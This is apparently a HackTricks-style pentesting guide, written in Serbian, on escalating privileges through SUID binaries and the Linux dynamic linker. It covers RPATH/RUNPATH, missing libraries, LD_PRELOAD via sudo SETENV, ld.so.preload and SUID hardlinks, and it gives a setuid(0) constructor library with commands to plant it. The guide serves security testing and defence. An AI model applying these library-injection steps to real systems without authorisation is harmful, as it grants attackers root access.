# Zloupotreba SUID deljenih biblioteka i linkera

{{#include ../../banners/hacktricks-training.md}}

SUID binarni fajlovi se obično proveravaju u potrazi za direktnim izvršavanjem komandi, ali prilagođeni SUID programi mogu biti ranjivi i preko dinamičkog linkera. Zajednička tema je jednostavna: privilegovani izvršni fajl učitava kod sa putanje ili iz konfiguracije na koju korisnik sa nižim privilegijama može da utiče.<sup>[[1]](#references)</sup>

Ova stranica se fokusira na obrasce generičkih tehnika: nedostajuće biblioteke, direktorijume biblioteka sa dozvolom za upis, `RPATH`/`RUNPATH`, `LD_PRELOAD` preko sudo, konfiguraciju linkera i zabunu oko SUID hard linkova.

Za zaglavlja ELF programa, dinamički odeljak i ponašanje učitavača na kojima se zasnivaju ove provere, pogledajte [Osnovne informacije o ELF-u](../../binary-exploitation/basic-stack-binary-exploitation-methodology/elf-tricks.md).

## Brza enumeracija

Započnite pronalaženjem neuobičajenih SUID fajlova i proverom da li su dinamički povezani:<sup>[[1]](#references)[[3]](#references)</sup>

```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```

Koristite `readelf` za nepoznatu izvršnu datoteku: [`ldd` može da izvrši nepouzdani ELF interpreter](https://man7.org/linux/man-pages/man1/ldd.1.html). `readelf` prikazuje direktne zavisnosti, zato zasebno proverite putanju koju je loader zaista izabrao.<sup>[[1]](#references)[[3]](#references)</sup>

Obratite pažnju na nestandardne lokacije, prilagođene putanje aplikacija, binarne datoteke u vlasništvu root-a koje se nalaze izvan direktorijuma kojima upravlja paketni menadžer i zavisnosti koje se učitavaju iz direktorijuma u koje može da se upisuje.<sup>[[1]](#references)</sup>

Korisne provere dozvola za upisivanje:

```bash
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```

## Missing Shared Object Injection

Neki prilagođeni SUID binarni fajlovi pokušavaju da učitaju deljeni objekat koji ne postoji. Ako se nedostajuća putanja nalazi u direktorijumu kojim upravlja napadač, binarni fajl može da učita kôd koji je dostavio napadač, sa privilegijama efektivnog korisnika.<sup>[[1]](#references)</sup>

Ista granica važi za **prilagođeni binarni fajl dozvoljen kroz sudo** kada poziva `dlopen()` sa apsolutnom putanjom do `.so` fajla unutar kućnog ili konfiguracionog direktorijuma u koji korisnik može da upisuje. Ovo kasno učitavanje biblioteke možda neće biti prikazano u izlazu komande `ldd` niti u ELF `NEEDED` stavkama. Ograničena provera pomoću `strings` ili praćenje **neprivilegovane** invokacije mogu da otkriju putanju kojoj se pokušava pristupiti; lozinka aplikacije ili izbor u meniju mogu da uslovljavaju tu proveru. Pre nego što ovo smatrate eskalacijom privilegija, proverite efektivno sudo pravilo, tačnu putanju i dozvole nadređenog direktorijuma, kao i da li privilegovana invokacija stiže do te provere. Nemojte pokretati sudo cilj samo da biste ga izlistali.

Neuspešna učitavanja biblioteka pronađite pomoću syscall filtera komande `strace`:<sup>[[2]](#references)</sup>

```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```

Ako binarna datoteka traži `libexample.so` na putanji u koju je moguće pisati, minimalna proof biblioteka može da koristi konstruktor. Tokom validacije dokaz uticaja treba da bude bezopasan:<sup>[[6]](#references)</sup>

```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
    setuid(0);
    setgid(0);
    system("id > /tmp/suid-so-ran");
}
```

Napravite ga pod tačnim nazivom fajla koji binarna datoteka pokušava da učita:

```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```

Iskorišćavanje nije moguće samo zato što nedostaje biblioteka. Napadač mora moći da postavi kompatibilni shared object na putanju koju će privilegovani loader prihvatiti.<sup>[[1]](#references)</sup>

## Direktorijum biblioteka sa dozvolom za pisanje

Ponekad postoje sve zavisnosti, ali je u neki od direktorijuma koji se koriste za njihovo pronalaženje moguće pisati. To može omogućiti zamenu učitane biblioteke ili postavljanje biblioteke višeg prioriteta sa istim imenom.<sup>[[1]](#references)</sup>

Ista provera važi za prilagođeni ELF **dozvoljen kroz sudo**, čak i kada ELF nema SUID bit i dozvoljeni RunAs nalog nije root. Uporedite njegove stavke `DT_NEEDED` sa putanjom biblioteke koju će loader razrešiti, a zatim proverite da li pozivalac može da upisuje u tu datoteku ili da je zameni preko nadređenog direktorijuma u koji može da upisuje i kroz koji može da prolazi. Potvrdite tačno sudo RunAs pravilo, simboličke veze i ACL-ove, loader politiku i da li ciljni proces učitava biblioteku kao nalog sa višim privilegijama. Datoteka `.so` u koju može da se upisuje ili samo ime zavisnosti predstavljaju tek trag; pregledajte metapodatke bez pokretanja sudo komande.<sup>[[1]](#references)[[3]](#references)[[5]](#references)</sup>

Proverite putanje zavisnosti:<sup>[[1]](#references)[[3]](#references)</sup>

```bash
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```

Ako direktorijum dozvoljava upis, proverite to u laboratoriji pristupom koji koristi kopije. Zamena sistemskih biblioteka na aktivnom hostu može dovesti do toga da procesi koji se istovremeno pokreću koriste međusobno neusklađene verzije biblioteka.<sup>[[8]](#references)</sup>

### Biblioteke u koje je moguće upisivati unutar chroot-a

Sam chroot ne zatvara nasleđene deskriptore datoteka niti ograničava sav pristup sistemu datoteka. Ako sandbox ostavi deskriptor direktorijuma koji pokazuje izvan novog korena, a proces u izolovanom okruženju može da dereferencira taj deskriptor (na primer, preko dostupnog unosa `/proc/<pid>/fd/`), putanje na hostu mogu ostati dostupne. Ovo je problem granice sistema datoteka; samo po sebi ne daje root privilegije.<sup>[[11]](#references)[[12]](#references)</sup>

Posebno proverite da li korisnik u izolovanom okruženju može da upisuje u direktorijum biblioteka koji će koristiti **host root-SUID izvršna datoteka** pokrenuta iz tog okruženja. Loader razrešava zavisnosti u prikazu sistema datoteka koji vidi proces, pa biblioteka koju kontroliše napadač i koja se nalazi tamo može da se izvrši sa efektivnim identitetom SUID programa. Potvrdite tačnu izvršnu datoteku, njen SUID bit i pravila mount-a, odredište deskriptora i dozvole pristupa, putanju za pretragu biblioteka u izolovanom okruženju i to da program zaista može da dođe do izvršne datoteke na hostu. File capability na pokretaču sandbox-a, direktorijum u koji je moguće upisivati u izolovanom okruženju ili host SUID binarna datoteka sami po sebi samo ukazuju na moguću ranjivost; uspeh celog lanca zavisi od implementacije sandbox-a.<sup>[[1]](#references)[[11]](#references)[[12]](#references)</sup>

## RPATH i RUNPATH

`RPATH` i `RUNPATH` su unosi u dinamičkom odeljku koji loader-u govore gde da traži biblioteke. Opasni su u SUID programima kada upućuju na direktorijume u koje napadač može da upisuje.<sup>[[1]](#references)</sup>

Otkrijte ih:<sup>[[3]](#references)[[10]](#references)</sup>

```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```

Primer rizičnog izlaza:

```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```

Ako je u `/opt/app/lib` dozvoljen upis i binarni fajl zahteva `libcustom.so`, napadač možda može tamo da postavi zlonamerni `libcustom.so`:<sup>[[1]](#references)</sup>

```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```

`RPATH` i `RUNPATH` se ne ponašaju identično u svim detaljima razrešavanja, ali je praktično pitanje pri proveri eskalacije privilegija isto: da li SUID binarna datoteka traži biblioteku u direktorijumu u koji napadač može da upisuje?<sup>[[1]](#references)</sup>

## LD_PRELOAD, LD_LIBRARY_PATH i SUID

Kod običnih programa, `LD_PRELOAD` i `LD_LIBRARY_PATH` mogu da nametnu ili utiču na učitavanje shared objekata. Kod SUID programa, dinamički učitavač obično ulazi u režim bezbednog izvršavanja i ignoriše opasne promenljive okruženja.<sup>[[1]](#references)</sup>

To znači da obična SUID binarna datoteka obično nije ranjiva samo zato što korisnik može da podesi `LD_PRELOAD`:<sup>[[1]](#references)</sup>

```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```

Uobičajeni izuzetak je sudo pravilo koje dozvoljava postavljanje promenljive okruženja u komandnoj liniji za ciljnu komandu, na primer pomoću oznake `SETENV` ili odgovarajuće opcije `setenv`. Ako je ciljna komanda dinamički linkovana i sudo prihvata `LD_PRELOAD=/path/to/library`, ciljna komanda može da učita kod koji kontroliše pozivalac. Proverite efektivno pravilo i identitet ciljne komande. Samo dodavanje `LD_PRELOAD` u `env_keep` nije dovoljno na sistemima gde dinamički loader uklanja nasleđeni `LD_PRELOAD` pre pokretanja SUID procesa `sudo`; dodelu vrednosti u komandnoj liniji sudo obrađuje nakon sopstvenog pokretanja.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

```bash
sudo -l
# Check SETENV/setenv and the target command's allowed arguments
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```

Nemojte mešati ove slučajeve; pravila loadera i sudo politike navedena iznad ih razlikuju:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- `LD_PRELOAD` uz običnu SUID binarnu datoteku: obično ga blokira secure execution.
- `LD_PRELOAD` prihvaćen kao sudo dodela u komandnoj liniji za privilegovanu, dinamički povezanu ciljnu datoteku: potencijalno je moguće iskoristiti.
- Nedostajući `.so` u putanji sa dozvolom upisa: moguće ga je iskoristiti kada SUID binarna datoteka prirodno učitava tu putanju.
- `RPATH`/`RUNPATH` do direktorijuma sa dozvolom upisa: moguće ih je iskoristiti kada se može kontrolisati potrebna biblioteka.
- Pristup za upis u `/etc/ld.so.preload` ili konfiguraciju linkera: utiče na ceo sistem i ima veliki uticaj.

## Konfiguracija linkera

`ld.so` koristi linker cache i `/etc/ld.so.preload`; `ldconfig` izgrađuje taj cache na osnovu `/etc/ld.so.conf` i datoteka koje on uključuje, obično iz `/etc/ld.so.conf.d/`.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Provere visokog prioriteta:

```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```

Konfiguracija linkera u koju je moguće pisati obično je ozbiljniji problem od jedne ranjive SUID binarne datoteke, jer može da utiče na mnoge dinamički linkovane procese. `/etc/ld.so.preload` je posebno opasan jer može da nametne učitavanje deljenog objekta u privilegovane procese.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## Zabuna oko SUID hardlinkova

Hardlinkovi mogu da učine da se isti SUID inode pojavljuje pod više imena.<sup>[[9]](#references)</sup> Ovo je korisno za skrivanje privilegovanog pomoćnog programa, zbunjivanje pri čišćenju ili zaobilaženje naivne provere zasnovane na putanjama.

Pronađite SUID datoteke sa više od jedne veze:<sup>[[9]](#references)</sup>

```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```

Pregledajte sve putanje do istog inode-a:<sup>[[9]](#references)</sup>

```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```

Zloupotreba nije u tome što hardlink menja dozvole. Zloupotreba je zabuna oko putanje: privilegovani inode može biti dostupan preko imena koje branioci ili skripte ne očekuju.<sup>[[9]](#references)</sup> Za detaljniji opis inode-ova i rada sa hardlink-ovima pogledajte [Fajl sistem, inode-ovi i oporavak](../main-system-information/filesystem-inodes-and-recovery.md).

## Odbrambene napomene

- SUID binarne datoteke svedite na minimum, redovno ih proveravajte i, gde je moguće, upravljajte njima preko paketnog sistema.
- Izbegavajte unose `RPATH`/`RUNPATH` koji upućuju na direktorijume u koje može da se upisuje ili kojima upravlja aplikacija.<sup>[[1]](#references)[[8]](#references)</sup>
- Direktorijume sa bibliotekama održavajte u vlasništvu root-a i bez dozvole za upis za obične korisnike.<sup>[[8]](#references)</sup>
- Nemojte preko sudo-a čuvati `LD_PRELOAD`, `LD_LIBRARY_PATH` ili slične promenljive loader-a.<sup>[[1]](#references)[[5]](#references)</sup>
- Nadgledajte `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` i neočekivane SUID datoteke.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- Proveravajte SUID datoteke sa hardlink-ovima i istražite prilagođene SUID omotače izvan standardnih sistemskih putanja.<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — stranica Linux priručnika](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — stranica Linux priručnika](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf (GNU binarni alati)](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — stranica Linux priručnika](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — stranica Linux priručnika](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [Uobičajeni atributi (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — stranica Linux priručnika](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Ojačavanje dinamičkog linker-a (GNU C biblioteka)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Hardlink-ovi (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump (GNU binarni alati)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
- [11] [chroot(2) — stranica Linux priručnika](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [12] [proc_pid_fd(5) — stranica Linux priručnika](https://man7.org/linux/man-pages/man5/proc_pid_fd.5.html)
{{#include ../../banners/hacktricks-training.md}}
